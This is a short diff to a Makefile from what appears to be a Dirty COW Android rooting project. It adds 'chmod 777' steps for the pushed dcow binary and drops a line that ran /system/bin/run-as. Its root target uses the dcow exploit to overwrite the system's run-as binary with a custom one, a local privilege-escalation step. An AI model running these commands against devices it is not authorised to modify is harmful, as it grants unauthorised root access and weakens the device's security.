@@ -9,6 +9,7 @@ build:
 
 push: build
 	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
+	adb shell 'chmod 777 /data/local/tmp/dcow'
 
 test: push
 	adb push test.sh /data/local/tmp/test.sh
@@ -20,9 +21,9 @@ test: push
 	adb shell 'cat /data/local/tmp/test2' | xxd
 
 root: push
+	adb shell 'chmod 777 /data/local/tmp/dcow'
 	adb push libs/$(ARCH)/run-as /data/local/tmp/run-as
 	adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'
-	adb shell /system/bin/run-as
 
 clean:
 	rm -rf libs
